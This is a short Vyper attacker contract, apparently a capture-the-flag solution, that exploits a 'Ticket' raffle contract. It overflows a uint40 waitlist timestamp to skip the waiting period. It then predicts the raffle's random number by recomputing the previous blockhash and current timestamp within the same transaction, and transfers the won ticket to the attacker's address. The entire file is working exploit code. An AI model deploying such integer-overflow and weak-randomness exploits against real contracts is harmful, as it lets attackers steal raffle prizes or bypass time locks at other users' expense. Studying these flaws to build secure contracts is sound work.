# @version ^0.3.7

interface ITicket:
    def waitlist(addr: address) -> uint40: view
    def hasTicket(addr: address) -> bool: view
    def joinWaitlist(): nonpayable
    def updateWaitTime(_time: uint256): nonpayable
    def joinRaffle(_guess: uint256): nonpayable
    def giftTicket(_to: address): nonpayable

owner: immutable(address)

ticket: ITicket

@external
@payable
def __init__(_ticket: address):
    owner = msg.sender
    self.ticket = ITicket(_ticket)

@external
def attack():
    assert msg.sender == owner, "!owner"
    self.ticket.joinWaitlist()
    overflow: uint256 = convert(
        max_value(uint40) - self.ticket.waitlist(self) + 2,
        uint256,
    )
    self.ticket.updateWaitTime(overflow)
    assert convert(self.ticket.waitlist(self), uint256) <= block.timestamp, "wait"
    guess: uint256 = convert(
        keccak256(
            concat(
                blockhash(block.number -1),
                convert(block.timestamp, bytes32)
            )
        ),
        uint256,
    )
    self.ticket.joinRaffle(guess)
    assert self.ticket.hasTicket(self), "get ticket"
    self.ticket.giftTicket(owner)
    assert self.ticket.hasTicket(owner), "owner needs ticket"
